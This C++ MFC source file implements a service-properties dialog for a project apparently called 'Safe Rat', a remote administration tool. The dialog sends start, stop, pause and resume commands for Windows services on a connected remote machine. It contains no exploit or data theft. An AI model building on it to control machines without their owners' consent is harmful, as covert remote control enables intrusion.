// CServerInfoDlg.cpp: 实现文件
//

#include "pch.h"
#include "Safe Rat.h"
#include "CServerInfoDlg.h"
#include "afxdialogex.h"


// CServerInfoDlg 对话框

IMPLEMENT_DYNAMIC(CServerInfoDlg, CDialogEx)

CServerInfoDlg::CServerInfoDlg(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_SERVERINFO_DLG, pParent)
{
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_ICON_SERVER));
}

CServerInfoDlg::~CServerInfoDlg()
{
}

void CServerInfoDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_COMBO1, m_combox_runway);
}


BEGIN_MESSAGE_MAP(CServerInfoDlg, CDialogEx)
	ON_CBN_SELCHANGE(IDC_COMBO1, &CServerInfoDlg::OnCbnSelchangeCombo1)
	ON_BN_CLICKED(IDC_BUTTON2, &CServerInfoDlg::OnBnClickedButton2)
	ON_BN_CLICKED(IDC_BUTTON3, &CServerInfoDlg::OnBnClickedButton3)
	ON_BN_CLICKED(IDC_BUTTON4, &CServerInfoDlg::OnBnClickedButton4)
	ON_BN_CLICKED(IDC_BUTTON5, &CServerInfoDlg::OnBnClickedButton5)
	ON_BN_CLICKED(IDC_BUTTON8, &CServerInfoDlg::OnBnClickedButton8)
END_MESSAGE_MAP()


// CServerInfoDlg 消息处理程序


BOOL CServerInfoDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	m_combox_runway.InsertString(0, _T("自动")); // 0
	m_combox_runway.InsertString(1, _T("手动")); // 1
	m_combox_runway.InsertString(2, _T("已禁用")); // 2

	SetDlgItemText(IDC_EDIT_NAME, m_ServiceInfo.strSerName);
	SetDlgItemText(IDC_EDIT_SHOWNAME, m_ServiceInfo.strSerDisPlayname);
	SetDlgItemText(IDC_EDIT_D, m_ServiceInfo.strSerDescription);
	SetDlgItemText(IDC_EDIT_PATH, m_ServiceInfo.strFilePath);
	SetDlgItemText(IDC_STATIC_ST, m_ServiceInfo.strSerState);


	if (m_ServiceInfo.strSerRunway == _T("Disabled"))
		m_combox_runway.SetCurSel(2);
	else if (m_ServiceInfo.strSerRunway == _T("Demand Start"))
		m_combox_runway.SetCurSel(1);
	else
		m_combox_runway.SetCurSel(0);


	SetWindowText(m_ServiceInfo.strSerDisPlayname + _T("的属性"));

	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}
void CServerInfoDlg::SendToken(BYTE bToken)
{
	int nPacketLength = (m_ServiceInfo.strSerName.GetLength() + 1);;
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
	lpBuffer[0] = bToken;

	memcpy(lpBuffer + 1, m_ServiceInfo.strSerName.GetBuffer(0), m_ServiceInfo.strSerName.GetLength());
	m_iocpServer->Send(m_pContext, lpBuffer, nPacketLength);
	LocalFree(lpBuffer);
}
//更改启动类型
void CServerInfoDlg::OnCbnSelchangeCombo1()
{
	//启动应用按钮
	GetDlgItem(IDC_BUTTON8)->EnableWindow(TRUE);
}

//启动
void CServerInfoDlg::OnBnClickedButton2()
{
	// TODO: Add your control notification handler code here
	SendToken(COMMAND_STARTSERVERICE);
}


//停止
void CServerInfoDlg::OnBnClickedButton3()
{
	SendToken(COMMAND_STOPSERVERICE);
}

//暂停
void CServerInfoDlg::OnBnClickedButton4()
{
	SendToken(COMMAND_PAUSESERVERICE);
}
//恢复
void CServerInfoDlg::OnBnClickedButton5()
{
	// TODO: Add your control notification handler code here
	SendToken(COMMAND_CONTINUESERVERICE);
}

//应用
void CServerInfoDlg::OnBnClickedButton8()
{
	GetDlgItem(IDC_BUTTON8)->EnableWindow(FALSE);
}


BOOL CServerInfoDlg::PreTranslateMessage(MSG* pMsg)
{
	if (
		pMsg->message == WM_KEYDOWN		
		&&(	pMsg->wParam == VK_ESCAPE	 
		||	pMsg->wParam == VK_CANCEL	
		||	pMsg->wParam == VK_RETURN	
		))
		return TRUE;

	return CDialogEx::PreTranslateMessage(pMsg);
}
